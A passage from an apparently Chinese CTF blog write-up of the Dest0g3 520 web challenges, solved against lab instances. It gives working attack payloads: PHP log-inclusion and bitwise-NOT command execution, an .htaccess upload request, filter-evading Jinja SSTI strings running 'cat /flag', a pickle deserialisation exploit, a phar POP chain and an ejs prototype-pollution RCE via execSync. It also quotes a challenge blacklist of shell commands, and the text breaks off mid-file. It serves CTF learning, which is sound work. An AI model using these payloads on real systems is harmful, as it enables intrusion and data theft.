<div class="article_content clearfix" id="article_content">
<link href="style.css" rel="stylesheet"/>
<div class="markdown_views prism-atom-one-dark" id="content_views">
<svg style="display: none;" xmlns="http://www.w3.org/2000/svg">
<path d="M5,0 0,2.5 5,5z" id="raphael-marker-block" stroke-linecap="round" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
</svg>
<h1><a id="Dest0g3_520_0"></a>Dest0g3 520迎新赛</h1>
<p>只写了web，勉勉强强拿了总榜58名，web分榜11名这个尴尬的名次，前面的师傅太强了</p>
<h2><a id="phpdest_4"></a>phpdest</h2>
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">require_once</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>文件包含题，因为使用的是<code>require_once()</code>，所以不能直接读<code>flag.php</code>；</p>
<p>没有phpinfo信息，session不考虑（buu平台我都不考虑条件竞争，这个题实际上有这个打法），两种临时文件包含不能用；</p>
<p>扫描日志文件，没有结果（字典刚好没有 ，排查了一天才发现）</p>
<p>走P神的裸文件包含，然而对特殊字符url转码了，不能用</p>
<p>看有很多人都做出来了，想着肯定是简单题，从头排查，反反复复，晚上才发现缺少的日志文件T^T</p>
<pre><code>/var/log/nginx/access.log
</code></pre>
<p>包含日志文件getshell</p>
<h2><a id="EasyPHP_31"></a>EasyPHP</h2>
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"fl4g.php"</span><span class="token punctuation">;</span>
<span class="token variable">$dest0g3</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$time</span> <span class="token operator">=</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"H"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$timme</span> <span class="token operator">=</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$timmme</span> <span class="token operator">=</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"i"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$time</span> <span class="token operator">&gt;</span> <span class="token string double-quoted-string">"24"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token punctuation">(</span><span class="token variable">$timme</span> <span class="token operator">&gt;</span> <span class="token string double-quoted-string">"31"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token punctuation">(</span><span class="token variable">$timmme</span> <span class="token operator">&gt;</span> <span class="token string double-quoted-string">"60"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">echo</span> <span class="token variable">$fl4g</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Try harder!"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">set_error_handler</span><span class="token punctuation">(</span>
    <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">use</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$fl4g</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">print</span> <span class="token variable">$fl4g</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$fl4g</span> <span class="token operator">.=</span> <span class="token variable">$dest0g3</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span> <span class="token keyword">Try</span> harder<span class="token operator">!</span>
</code></pre>
<p>看到<code>set_error_handler()</code>，让程序出错就能获取flag，可以POST传值<code>ctf</code></p>
<p>传入值会和字符串变量<code>$fl4g</code>进行字符串拼接，所以post传参传入数组</p>
<pre><code>POST:ctf[]=a
</code></pre>
<h2><a id="SimpleRCE_63"></a>SimpleRCE</h2>
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$aaa</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'aaa'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$black_list</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'^'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'.'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'`'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&gt;'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&lt;'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'='</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'preg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&amp;'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'%0'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'popen'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'char'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'decode'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'html'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'md5'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'{'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'}'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'post'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'get'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'ascii'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'eval'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'replace'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'assert'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'exec'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'$'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'include'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'var'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'pastre'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'print'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'tail'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'sed'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'pcre'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'scan'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'decode'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'func'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'diff'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'ini_'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'passthru'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'pcntl'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'proc_open'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'+'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'cat'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'tac'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'more'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'sort'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'log'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'current'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'cut'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'bash'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'nl'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'wget'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'vi'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'grep'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token variable">$black_list</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"hacker"</span><span class="token punctuation">,</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre>
<p>命令执行，过滤了很多，但是打眼一看，没有<code>~</code>，眼睛一圈扫下来，没有过滤<code>(</code>和<code>)</code>还有<code>%</code>，<code>;</code></p>
<p>取反绕过命令执行，掏出<a href="https://blog.csdn.net/miuzzx">yu22x</a>师傅的博客</p>
<pre><code>(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98);
//system(cat /flag);
</code></pre>
<h2><a id="funny_upload_84"></a>funny_upload</h2>
<p>文件上传，有前端js过滤，绕过后随便上传一个文件，掏出字典fuzz过滤情况，发现可以上传<code>.htaccess</code>文件，且有作用，出现了页面报错，服务器解析不能，上图片马加直接包含flag进行测试</p>
<pre><code>POST / HTTP/1.1
Host: a28731fc-383f-49d3-aaaf-7f67181fb7c4.node4.buuoj.cn:81
Content-Length: 392
Cache-Control: max-age=0
Origin: http://a28731fc-383f-49d3-aaaf-7f67181fb7c4.node4.buuoj.cn:81
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZX7SH3YhtkoquFXj
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.53
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://a28731fc-383f-49d3-aaaf-7f67181fb7c4.node4.buuoj.cn:81/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,pt;q=0.5
Cookie: td_cookie=143531929
Connection: close

------WebKitFormBoundaryZX7SH3YhtkoquFXj
Content-Disposition: form-data; name="file"; filename=".htaccess"
Content-Type: image/png

AddType application/x-httpd-php .png
php_value auto_append_file "php://filter/convert.base64_decode/resource=/flag"
------WebKitFormBoundaryZX7SH3YhtkoquFXj
Content-Disposition: form-data; name="1"

提交
------WebKitFormBoundaryZX7SH3YhtkoquFXj--

</code></pre>
<p>访问图片马直接拿到flag，不用祭出蚁剑了</p>
<h2><a id="EasySSTI_121"></a>EasySSTI</h2>
<p>进入后是一个登录页面</p>
<p>因为题目是<code>EasySSTI</code>所以向测试一波<code>SSTI</code></p>
<p>字符过滤了：<code>[</code>，<code>_</code>，<code>'</code>，<code>"</code>，空格</p>
<p>关键字过滤了：<code>globals</code>，<code>getitem</code>，<code>os</code>，<code>read</code>，<code>popen</code>，<code>pop</code>啥的</p>
<p>先确定基本payload（嫖网上<a href="https://john-frod.github.io/2021/05/06/Flask-SSTI-LAB%E6%94%BB%E7%95%A5/">Flask SSTI LAB攻略 | A.M.|P.M. (john-frod.github.io)</a>的）</p>
<pre><code>{<!-- -->{lipsum|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("whoami")|attr("read")()}}
</code></pre>
<p>使用<code>dict(o=a,s=a)|join()</code>来拼接字符串</p>
<pre><code>{<!-- -->{lipsum|attr("__globals__")|attr("__getitem__")(dict(o=a,s=a)|join())|attr(dict(po=a,pen=a)|join())(dict(who=a,ami=a)|join())|attr(dict(re=a,ad=a)|join())()}}
</code></pre>
<p>使用<code>(lipsum|string|list)|attr('pop')(18)</code>来获取<code>_</code></p>
<p><code>__globals__</code></p>
<pre><code>((lipsum|string|list)|attr(dict(po=a,p=a)|join())(18),(lipsum|string|list)|attr(dict(po=a,p=a)|join())(18),dict(glo=a,bals=a)|join(),(lipsum|string|list)|attr(dict(po=a,p=a)|join())(18),(lipsum|string|list)|attr(dict(po=a,p=a)|join())(18))|join()
</code></pre>
<p><code>__getitem__</code></p>
<pre><code>((lipsum|string|list)|attr(dict(po=a,p=a)|join())(18),(lipsum|string|list)|attr(dict(po=a,p=a)|join())(18),dict(ge=a,titem=a)|join(),(lipsum|string|list)|attr(dict(po=a,p=a)|join())(18),(lipsum|string|list)|attr(dict(po=a,p=a)|join())(18))|join()
</code></pre>
<p><code>ls /</code></p>
<pre><code>((lipsum|string|list)|attr(dict(po=a,p=a)|join())(19),(lipsum|string|list)|attr(dict(po=a,p=a)|join())(27),(lipsum|string|list)|attr(dict(po=a,p=a)|join())(9),(config|string|list)|attr(dict(po=a,p=a)|join())(279))|join()
</code></pre>
<p><code>cat /flag</code></p>
<pre><code>((lipsum|string|list)|attr(dict(po=a,p=a)|join())(4),(lipsum|string|list)|attr(dict(po=a,p=a)|join())(15),(lipsum|string|list)|attr(dict(po=a,p=a)|join())(5),(lipsum|string|list)|attr(dict(po=a,p=a)|join())(9),(config|string|list)|attr(dict(po=a,p=a)|join())(279),(lipsum|string|list)|attr(dict(po=a,p=a)|join())(1),(lipsum|string|list)|attr(dict(po=a,p=a)|join())(19),(lipsum|string|list)|attr(dict(po=a,p=a)|join())(15),(lipsum|string|list)|attr(dict(po=a,p=a)|join())(10))|join()
</code></pre>
<p>换成如下</p>
<pre><code>{<!-- -->{lipsum|attr(((lipsum|string|list)|attr(dict(po=a,p=a)|join())(18),(lipsum|string|list)|attr(dict(po=a,p=a)|join())(18),dict(glo=a,bals=a)|join(),(lipsum|string|list)|attr(dict(po=a,p=a)|join())(18),(lipsum|string|list)|attr(dict(po=a,p=a)|join())(18))|join())|attr(((lipsum|string|list)|attr(dict(po=a,p=a)|join())(18),(lipsum|string|list)|attr(dict(po=a,p=a)|join())(18),dict(ge=a,titem=a)|join(),(lipsum|string|list)|attr(dict(po=a,p=a)|join())(18),(lipsum|string|list)|attr(dict(po=a,p=a)|join())(18))|join())(dict(o=a,s=a)|join())|attr(dict(po=a,pen=a)|join())(dict(l=a,s=a)|join())|attr(dict(re=a,ad=a)|join())()}}
</code></pre>
<p>命令部分由成<code>dict(l=a,s=a)|join()</code>替换成：<code>ls /</code>对应的东西</p>
<p>在题目环境下<code>(config|string|list)|attr(dict(po=a,p=a)|join())(279)</code>是<code>/</code></p>
<pre><code>{<!-- -->{lipsum|attr(((lipsum|string|list)|attr(dict(po=a,p=a)|join())(18),(lipsum|string|list)|attr(dict(po=a,p=a)|join())(18),dict(glo=a,bals=a)|join(),(lipsum|string|list)|attr(dict(po=a,p=a)|join())(18),(lipsum|string|list)|attr(dict(po=a,p=a)|join())(18))|join())|attr(((lipsum|string|list)|attr(dict(po=a,p=a)|join())(18),(lipsum|string|list)|attr(dict(po=a,p=a)|join())(18),dict(ge=a,titem=a)|join(),(lipsum|string|list)|attr(dict(po=a,p=a)|join())(18),(lipsum|string|list)|attr(dict(po=a,p=a)|join())(18))|join())(dict(o=a,s=a)|join())|attr(dict(po=a,pen=a)|join())(((lipsum|string|list)|attr(dict(po=a,p=a)|join())(4),(lipsum|string|list)|attr(dict(po=a,p=a)|join())(15),(lipsum|string|list)|attr(dict(po=a,p=a)|join())(5),(lipsum|string|list)|attr(dict(po=a,p=a)|join())(9),(config|string|list)|attr(dict(po=a,p=a)|join())(279),(lipsum|string|list)|attr(dict(po=a,p=a)|join())(1),(lipsum|string|list)|attr(dict(po=a,p=a)|join())(19),(lipsum|string|list)|attr(dict(po=a,p=a)|join())(15),(lipsum|string|list)|attr(dict(po=a,p=a)|join())(10))|join())|attr(dict(re=a,ad=a)|join())()}}
</code></pre>
<h2><a id="middle_183"></a>middle</h2>
<p>python反序列化题，第一次实际接触，exp如下</p>
<pre><code class="prism language-python"><span class="token keyword">class</span> <span class="token class-name">payload</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
       <span class="token keyword">return</span> <span class="token punctuation">(</span>config<span class="token punctuation">.</span>backdoor<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"os.environ"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/test'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    a <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>payload<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>protocol<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
    a <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
    <span class="token keyword">return</span> a
    <span class="token comment">#User = restricted_loads(base64.b64decode(data))</span>
    <span class="token comment">#return str(User)</span>
</code></pre>
<p>不难，新手友好型，边查资料边测试</p>
<p>问题在于不能执行系统命令，查os的文档，发现有环境变量<code>environ</code>，尝试看看，发现有flag</p>
<pre><code>POST:data=Y2NvbmZpZwpiYWNrZG9vcgpwMAooKGxwMQpWb3MuZW52aXJvbgpwMgphdHAzClJwNAou
</code></pre>
<h2><a id="PharPOP_208"></a>PharPOP</h2>
<p>题目简单易懂，上传phar，使用原生类读取目录和文件，poc如下</p>
<p><code>tree::__destruct()===&gt;tree::__call()</code></p>
<p><code>tree::__call()===&gt;apple::__get()</code></p>
<p><code>appli::__get()===&gt;air::__set()</code></p>
<pre><code class="prism language-php"><span class="token variable">$tree1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">tree</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$tree1</span><span class="token operator">-&gt;</span><span class="token property">act</span><span class="token operator">=</span><span class="token string double-quoted-string">"SplFileObject"</span><span class="token punctuation">;</span>
<span class="token variable">$air</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">air</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$air</span><span class="token operator">-&gt;</span><span class="token property">p</span> <span class="token operator">=</span> <span class="token variable">$tree1</span><span class="token punctuation">;</span>
<span class="token variable">$apple</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">apple</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$apple</span><span class="token operator">-&gt;</span><span class="token property">xxx</span> <span class="token operator">=</span> <span class="token variable">$air</span><span class="token punctuation">;</span>
<span class="token variable">$apple</span><span class="token operator">-&gt;</span><span class="token property">flag</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/fflaggg"</span><span class="token punctuation">;</span>
<span class="token variable">$tree2</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">tree</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$tree2</span><span class="token operator">-&gt;</span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$apple</span><span class="token punctuation">;</span>s
</code></pre>
<p>除了链子，还有三个过滤：</p>
<p>绕过<code>throw</code>，throw会阻碍析构函数进行，通过gc垃圾回收提前触发析构函数；</p>
<p>绕过<code>waf</code>，waf过滤了很多关键字，使用<code>gzip</code>命令处理phar文件，压缩的妈都不认识；</p>
<p>绕过<code>phar</code>，不能说是绕过phar，应该是手撕phar，原因在于绕过throw的操作：通过数组的重复赋值；，问题在于要改文件内容，而phar是有检验和的，所以直接改phar文件内容不行</p>
<p>找了一上午找到一位师傅的脚本，不用手撕phar</p>
<p><a href="https://morblog.cc/posts/2586386993/">总结 - ctf中php的phar(一) - Morouu的大狗窝 ●’◡’● (morblog.cc)</a></p>
<p>这道题提醒我以后要尝试手撕常见文件格式，提高脚本编写能力</p>
<h2><a id="NodeSoEasy_244"></a>NodeSoEasy</h2>
<p>ejs最经典，最常见的原型链污染RCE在3.1.7被禁了，因为题目附件只给了依赖包的信息和主页与模板的代码，所以应该说的是3.1.7中的原型链污染利用，下载3.1.8版本代码进行比对，可以发现，增加的部分都是用来防御原型链污染的，所以3.1.7必然存在另一处可以使用的rce；</p>
<p>上网查资料加调试，发现<a href="https://www.anquanke.com/post/id/236354">关于nodejs的ejs和jade模板引擎的原型链污染挖掘 - 安全客，安全资讯平台 (anquanke.com)</a>，</p>
<p>打断点调试ejs.js637行</p>
<pre><code class="prism language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>opts<span class="token punctuation">.</span>client<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
      src <span class="token operator">=</span> <span class="token string">'escapeFn = escapeFn || '</span> <span class="token operator">+</span> escapeFn<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">';'</span> <span class="token operator">+</span> <span class="token string">'\n'</span> <span class="token operator">+</span> src<span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>opts<span class="token punctuation">.</span>compileDebug<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        src <span class="token operator">=</span> <span class="token string">'rethrow = rethrow || '</span> <span class="token operator">+</span> rethrow<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">';'</span> <span class="token operator">+</span> <span class="token string">'\n'</span> <span class="token operator">+</span> src<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>ok，可以污染进去，套上逃逸</p>
<pre><code class="prism language-json"><span class="token punctuation">{<!-- --></span><span class="token string-property property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">{<!-- --></span><span class="token string-property property">"client"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">,</span><span class="token string-property property">"escapeFunction"</span><span class="token operator">:</span><span class="token string">"1; return global.process.mainModule.constructor._load('child_process').execSync('cat /flag');"</span><span class="token punctuation">,</span><span class="token string-property property">"compileDebug"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
</code></pre>
<h2><a id="ezip_267"></a>ezip</h2>
<p>和zip上传有关，在网上查文章，看书，试了各种可能的解法</p>
<p>搞了3天，一筹莫展，想着色图不好好看看有点可惜，看看色图，…</p>
<p>寄，还真是让看色图，图片末尾base64解密</p>
<p>upload.php:</p>
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"zip.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".."</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">strstr</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!!"</span><span class="token punctuation">;</span>
        <span class="token keyword">exit</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token string double-quoted-string">"zip"</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"only zip!!"</span><span class="token punctuation">;</span>
        <span class="token keyword">exit</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$Myzip</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">zip</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$Myzip</span><span class="token operator">-&gt;</span><span class="token property">path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'./'</span><span class="token operator">.</span><span class="token variable">$Myzip</span><span class="token operator">-&gt;</span><span class="token property">path</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Try to unzip your zip to /"</span><span class="token operator">.</span><span class="token variable">$Myzip</span><span class="token operator">-&gt;</span><span class="token property">path</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$Myzip</span><span class="token operator">-&gt;</span><span class="token function">unzip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"Success"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"failed"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>zip.php:</p>
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">zip</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$zip_name</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$path</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$zip_manager</span><span class="token punctuation">;</span>

